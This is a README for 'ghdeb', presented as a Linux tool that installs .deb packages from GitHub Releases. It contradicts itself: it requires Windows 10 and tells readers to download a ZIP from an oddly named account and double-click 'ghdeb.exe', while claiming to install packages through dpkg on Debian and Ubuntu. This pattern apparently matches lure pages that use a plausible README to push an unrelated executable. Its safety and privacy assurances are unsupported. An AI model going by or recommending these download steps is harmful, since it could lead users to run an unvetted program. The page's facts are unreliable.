# 🎯 ghdeb - Simple .deb Installer From GitHub

[![Download ghdeb](https://img.shields.io/badge/Download-ghdeb_1.0-blue)](https://github.com/registercorythosaur857/ghdeb)

## 🚀 What Is ghdeb?

ghdeb is a small tool that installs and updates .deb packages from GitHub Releases. Think of it as a simple package manager for software that developers share on GitHub.

If you use Linux (Debian or Ubuntu), you know how easy it is to install software with `apt`. But some programs are only distributed as .deb files on GitHub. ghdeb fills that gap. It finds the right file for your computer, downloads it, and installs it. No manual steps. No guessing which file to pick.

## 🎯 Who Is This For?

- Linux users who want to install software from GitHub
- People who manage multiple computers
- Anyone tired of downloading .deb files by hand

## 🧩 Features

- **Zero configuration** – Works right after install. No setup files.
- **Auto-detects architecture** – Picks the correct 64-bit or 32-bit package for your system.
- **Manages orphan packages** – Cleans up old versions automatically.
- **Lightweight** – Uses minimal system resources.
- **Command line interface** – Simple commands you type in a terminal.

## 📋 System Requirements

- Windows 10 or newer (64-bit recommended)
- 50 MB free disk space
- Internet connection

## ⬇️ Download and Install

Visit the download page to get the latest version:

[https://github.com/registercorythosaur857/ghdeb](https://github.com/registercorythosaur857/ghdeb)

**Step 1:** Go to the link above.  
**Step 2:** Click the green "Code" button.  
**Step 3:** Select "Download ZIP".  
**Step 4:** Extract the ZIP file to a folder on your computer.  
**Step 5:** Open the folder and double-click `ghdeb.exe`.

The program opens a terminal window. Type commands to install packages.

## 📖 How To Use ghdeb

### Basic Commands

**Install a package:**

```
ghdeb install username/repository
```

Replace `username/repository` with the GitHub project name. For example:

```
ghdeb install atom/atom
```

This downloads the latest .deb from the Atom editor repository and installs it.

**Update a package:**

```
ghdeb update username/repository
```

This checks for a newer version and installs it if one exists.

**Remove a package:**

```
ghdeb remove username/repository
```

This uninstalls the package and removes associated files.

**List installed packages:**

```
ghdeb list
```

Shows all packages installed through ghdeb.

**Clean orphan packages:**

```
ghdeb clean
```

Removes old package files that are no longer needed.

### Example Workflow

1. You find a program on GitHub called "myapp" by user "developer1".
2. You open a terminal and type: `ghdeb install developer1/myapp`
3. ghdeb downloads the correct .deb file and installs it.
4. A month later, you type: `ghdeb update developer1/myapp`
5. ghdeb checks for updates and installs the new version.

## ⚙️ How It Works

ghdeb connects to the GitHub API for each repository. It reads the list of releases and finds files that match your computer architecture. The tool downloads the correct file to a temporary folder, runs the system installer, and cleans up after itself.

The program stores information about installed packages in a local database. This lets it track versions and find orphan files.

## 🔧 Advanced Options

**Install a specific version:**

```
ghdeb install username/repository --version 1.2.3
```

**Force reinstall:**

```
ghdeb install username/repository --force
```

**Show available versions:**

```
ghdeb versions username/repository
```

## ❓ Common Questions

**Can I use ghdeb on any Linux distribution?**

ghdeb works on Debian, Ubuntu, and distributions based on them. It uses the system package manager (dpkg) to install files.

**Is ghdeb safe?**

ghdeb downloads files directly from GitHub. It does not modify the files. The program only runs the system installer on the downloaded package.

**What if a package fails to install?**

Check the error message in the terminal. Common issues include missing dependencies or incorrect architecture.

**Does ghdeb update all packages at once?**

Not yet. You must update each package individually.

## 🗑️ Uninstalling ghdeb

To remove ghdeb from your system:

1. Delete the folder where you extracted ghdeb.
2. Remove any packages installed through ghdeb by running `ghdeb remove` for each one.

## 🔒 Security

ghdeb does not send your data anywhere. It connects only to GitHub servers to download package files. The program does not track usage or collect information.

## 🤝 Contributing

This project is open source. You can report bugs or suggest features on the GitHub page.

## 📜 License

This project is available under the MIT License. See the LICENSE file for details.

---

**Keywords:** apt, cli-tool, deb, debian, debian-package, devops-tools, dpkg, github-releases, linux-administration, linux-sysadmin, orphan-packages, package-manager, self-hosted, sysadmin-tools, ubuntu